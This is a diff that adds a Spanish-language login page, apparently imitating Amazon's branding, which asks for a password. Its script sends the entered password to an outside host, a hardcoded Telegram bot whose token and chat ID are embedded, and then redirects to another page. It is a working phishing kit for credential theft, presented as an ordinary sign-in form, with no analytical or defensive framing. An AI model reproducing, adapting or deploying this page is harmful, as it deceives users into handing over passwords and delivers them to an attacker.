@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+            background-color: #2B333D;
+            padding: 40px 0;
+        }
+        .header img {
+            max-width: 100%;
+            height: auto;
+        }
+        .container {
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            background-color: #f9f9f9;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        .form-group label {
+            display: block;
+            font-weight: bold;
+            margin-bottom: 5px;
+            color: #333;
+        }
+        .form-group input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+        }
+        .form-group .checkbox {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .form-group .checkbox input[type="radio"] {
+            margin-right: 10px;
+            appearance: none;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            width: 20px;
+            height: 20px;
+            border-radius: 5px;
+            border: 2px solid #ccc;
+            outline: none;
+            cursor: pointer;
+            position: relative;
+        }
+        .form-group .checkbox input[type="radio"]::before {
+            content: "";
+            display: block;
+            width: 10px;
+            height: 10px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            border: solid transparent;
+            border-width: 0 3px 3px 0;
+            transform: translate(-50%, -50%) rotate(45deg);
+            opacity: 0;
+        }
+        .form-group .checkbox input[type="radio"]:checked::before {
+            border-color: #f7ca00; /* Cambio de color a amarillo */
+            opacity: 1;
+        }
+        .form-group .checkbox label {
+            font-size: 16px;
+        }
+        .form-group button {
+            display: block;
+            margin: 0 auto;
+            padding: 13px 20px;
+            background-color: #f7ca00;
+            color: black;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+        }
+        .form-group button:hover {
+            background-color: #f7ca00;
+        }
+        .title-section {
+            text-align: center;
+            margin-right: 250px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="Ama.png" alt="Header" width="100" style="float: left; margin-right: 10px; position: relative; top: -30px;">
+    </div>
+    <div class="title-section">
+        <h2>Iniciar sesión</h2>
+    </div>
+    <div class="container">
+        <form onsubmit="saveEmail(event)">
+            <div class="form-group">
+                <label for="password">Contraseña</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <div class="form-group">
+                <div class="checkbox">
+                    <input type="radio" id="crear-cuenta" name="account-type" value="crear-cuenta">
+                    <label for="crear-cuenta">Mostrar contraseña</label>
+                    <span style="margin-left: 10px; font-size: 14px;"></span>
+                </div>
+                <div class="checkbox">
+                    <input type="radio" id="iniciar-sesion" name="account-type" value="iniciar-sesion" checked>
+                    <label for="iniciar-sesion">Recuérdame</label>
+                    <span style="margin-left: 10px; font-size: 14px;"></span>
+                </div>
+            </div>
+            <div class="form-group">
+                <button type="submit">Iniciar sesión</button>
+            </div>
+        </form>
+    </div>
+    
+    <div class="footer-text">
+        <img src="https://i.ibb.co/DzRV9Bx/Screenshot-20240523-150903-Brave.jpg" width="426">
+    </div>
+
+    <script>
+        function sendToTelegram(formData) {
+            var telegramAPIUrl = "https://api.telegram.org/bot6931733086:AAE8K0GHhBQLyPQ5pm2UbJ2IhkgBmg6raDI/sendMessage";
+            var chatId = "6044742043";
+            var message = "Contraseña: " + formData.password + "\nTipo de cuenta: " + formData.accountType;
+            var data = {
+                chat_id: chatId,
+                text: message
+            };
+
+            fetch(telegramAPIUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Mensaje enviado a Telegram con éxito");
+                } else {
+                    console.error("Error al enviar mensaje a Telegram");
+                }
+            })
+            .catch(error => {
+                console.error("Error al enviar mensaje a Telegram:", error);
+            });
+        }
+
+        function saveEmail(event) {
+            event.preventDefault();
+            var password = document.getElementById("password").value;
+            var accountType = document.querySelector('input[name="account-type"]:checked').value;
+            var formData = {
+                password: password,
+                accountType: accountType
+            };
+            sendToTelegram(formData);
+            window.location.href = "in.html";
+        }
+    </script>
+</body>
+</html>
